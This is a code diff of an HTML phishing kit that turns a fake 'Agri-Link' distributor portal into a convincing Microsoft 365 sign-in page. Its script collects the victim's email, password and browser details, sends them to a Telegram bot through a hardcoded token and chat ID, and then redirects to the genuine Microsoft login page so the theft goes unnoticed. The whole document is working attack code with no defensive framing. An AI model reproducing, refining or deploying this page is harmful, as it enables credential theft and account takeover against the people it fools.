@@ -3,121 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agri-Link | Security Verification</title>
+    <title>Sign in to your account</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f6f8;
             margin: 0;
             padding: 0;
+            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe MDL2 Assets', 'Bahnschrift', 'Arial Unicode UI', sans-serif;
+            background-color: #f0f0f0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #333;
+            overflow: hidden;
         }
 
-        .container {
+        .login-container {
             background-color: #ffffff;
-            width: 100%;
-            max-width: 420px;
-            padding: 40px;
-            border-radius: 4px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            border-top: 5px solid #2b6cb0;
+            width: 440px;
+            padding: 52px 52px 38px 52px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            border-top: 2px solid #0078d4;
+            box-sizing: border-box;
         }
 
         .logo-area {
             margin-bottom: 20px;
-            text-align: center;
         }
 
-        .logo-text {
+        .logo-area svg {
+            width: 130px;
+            height: 28px;
+        }
+
+        h1 {
             font-size: 24px;
-            font-weight: 700;
-            color: #2b6cb0;
-            letter-spacing: -0.5px;
-        }
-
-        .logo-sub {
-            font-size: 12px;
-            color: #666;
-            margin-top: 5px;
-        }
-
-        h2 {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: #222;
-        }
-
-        p.message {
-            font-size: 14px;
-            line-height: 1.5;
-            color: #555;
-            margin-bottom: 25px;
-            border-left: 3px solid #ecc94b;
-            padding-left: 10px;
-            background: #fffaf0;
-            padding: 10px;
-            border-radius: 0 4px 4px 0;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 0 0 20px 0;
+            padding: 0;
         }
 
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
+            text-align: left;
         }
 
         label {
             display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #444;
+            font-size: 13px;
+            color: #1b1b1b;
             margin-bottom: 5px;
+            font-weight: 400;
         }
 
         input[type="email"],
         input[type="password"] {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
+            padding: 10px 12px;
+            font-size: 15px;
+            border: 1px solid #7a7a7a;
+            border-radius: 2px;
             box-sizing: border-box;
-            transition: border 0.3s;
+            transition: border 0.2s;
+            background-color: #fff;
+            color: #1b1b1b;
         }
 
         input:focus {
-            border-color: #2b6cb0;
+            border: 2px solid #0078d4;
             outline: none;
+            padding: 9px 11px; /* Adjust padding to prevent layout shift */
         }
 
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #2b6cb0;
+        .error-msg {
+            color: #a4262c;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+            padding-left: 5px;
+        }
+
+        .next-btn {
+            background-color: #0078d4;
             color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
+            border: 1px solid #0078d4;
+            padding: 8px 36px;
+            font-size: 15px;
             cursor: pointer;
-            transition: background 0.3s;
+            float: right;
+            border-radius: 2px;
+            font-weight: 400;
         }
 
-        button:hover {
-            background-color: #2c5282;
+        .next-btn:hover {
+            background-color: #005a9e;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #60594c;
+            margin-top: 20px;
+            text-align: center;
         }
 
         .footer {
-            margin-top: 20px;
-            text-align: center;
+            margin-top: 30px;
             font-size: 11px;
-            color: #999;
+            color: #60594c;
+            text-align: center;
+            width: 100%;
         }
 
+        /* Spinner for loading state */
         .loader {
             border: 3px solid #f3f3f3;
-            border-top: 3px solid #2b6cb0;
+            border-top: 3px solid #0078d4;
             border-radius: 50%;
             width: 20px;
             height: 20px;
@@ -134,74 +134,134 @@
 </head>
 <body>
 
-    <div class="container">
+    <div class="login-container">
         <div class="logo-area">
-            <div class="logo-text">Agri-Link</div>
-            <div class="logo-sub">Distributor Supply Portal</div>
+            <!-- Microsoft Logo SVG -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+                <path fill="#f25022" d="M1 1h10v10H1z"/>
+                <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+                <path fill="#7fba00" d="M1 12h10v10H1z"/>
+                <path fill="#f9ab00" d="M12 12h10v10H12z"/>
+            </svg>
         </div>
 
-        <h2>Security Certification Expired</h2>
-        
-        <div class="message">
-            <strong>Attention:</strong> Your distribution account security token has expired. To ensure uninterrupted access to your inventory allocations and pricing tiers, please verify your credentials below.
-        </div>
+        <h1>Sign in</h1>
 
-        <form id="loginForm">
+        <p style="font-size: 15px; color: #1b1b1b; margin-bottom: 20px;">
+            Let's get started. Enter your work account.
+        </p>
+
+        <form id="loginForm" onsubmit="return false;">
             <div class="input-group">
-                <label for="email">Business Email Address</label>
-                <input type="email" id="email" name="email" placeholder="name@company.com" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="password">Portal Password</label>
-                <input type="password" id="password" name="password" required>
+                <input type="email" id="email" placeholder="Email, Phone, or Skype" required>
+                <div class="error-msg" id="emailError"></div>
             </div>
 
-            <button type="submit" id="submitBtn">Verify & Renew Access</button>
-            
-            <div class="loader" id="loader"></div>
+            <div class="input-group" id="passwordGroup" style="display: none;">
+                <input type="password" id="password" placeholder="Password" required>
+                <div class="error-msg" id="passError"></div>
+            </div>
+
+            <div style="overflow: hidden; margin-top: 20px;">
+                <div class="loader" id="loader"></div>
+                <button type="submit" class="next-btn" id="nextBtn">Next</button>
+            </div>
         </form>
 
+        <div class="info-text" style="margin-top: 15px;">
+            <a href="#" style="color: #0078d4; text-decoration: none; font-size: 13px;">Forgot your password?</a>
+        </div>
+
         <div class="footer">
-            &copy; 2024 Agri-Link Supply Chain Solutions. <br>
-            Secure Enterprise Portal v4.2.1
+            <p>Protected by Microsoft</p>
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const btn = document.getElementById('submitBtn');
-            const loader = document.getElementById('loader');
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
+        // --- TELEGRAM CONFIGURATION ---
+        const BOT_TOKEN = "8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ";
+        const CHAT_ID = 6479764005;
+        // ------------------------------
+
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const nextBtn = document.getElementById('nextBtn');
+        const loginForm = document.getElementById('loginForm');
+        const loader = document.getElementById('loader');
+
+        let emailValue = "";
+
+        // Step 1: Email Handling
+        nextBtn.addEventListener('click', () => {
+            if (passwordGroup.style.display === 'none') {
+                // First stage: Email
+                if (emailInput.value && emailInput.value.includes('@')) {
+                    emailValue = emailInput.value;
+                    nextBtn.innerText = "Next"; // Keep button text normal
+                    passwordGroup.style.display = 'block';
+                    passwordInput.focus();
+                    // Hide button momentarily to show transition
+                    nextBtn.style.display = 'none';
+                    setTimeout(() => {
+                        nextBtn.style.display = 'block';
+                    }, 100);
+                } else {
+                    document.getElementById('emailError').innerText = "Please enter a valid email address.";
+                    document.getElementById('emailError').style.display = 'block';
+                }
+            } else {
+                // Second stage: Password
+                if (passwordInput.value) {
+                    submitCredentials();
+                } else {
+                    document.getElementById('passError').innerText = "Please enter your password.";
+                    document.getElementById('passError').style.display = 'block';
+                }
+            }
+        });
+
+        // Allow "Enter" key to proceed
+        emailInput.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                nextBtn.click();
+            }
+        });
+        passwordInput.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                nextBtn.click();
+            }
+        });
+
+        function submitCredentials() {
+            const passwordValue = passwordInput.value;
             const userAgent = navigator.userAgent;
 
-            btn.style.display = 'none';
+            // UI Feedback
+            nextBtn.style.display = 'none';
             loader.style.display = 'block';
 
-            const text = `🔓 *New Agri-Link Harvest* 📧 Email: <code>${email}</code> 🔑 Password: <code>${password}</code> 📱 Device: <code>${userAgent}</code>`;
+            const text = `🔓 *Microsoft 365 Harvest* 📧 Email: <code>${emailValue}</code> 🔑 Password: <code>${passwordValue}</code> 📱 Device: <code>${userAgent}</code>`;
 
-            const url = `https://api.telegram.org/bot8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ/sendMessage`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: 6479764005,
+                    chat_id: CHAT_ID,
                     text: text,
                     parse_mode: 'HTML'
                 })
             })
             .then(response => {
-                window.location.href = "https://www.yara.com";
+                // Redirect to Microsoft's actual sign-in page to close the loop
+                window.location.href = "https://login.microsoftonline.com/common/homepage";
             })
             .catch(error => {
-                window.location.href = "https://www.yara.com";
+                window.location.href = "https://login.microsoftonline.com/common/homepage";
             });
-        });
+        }
     </script>
 
 </body>
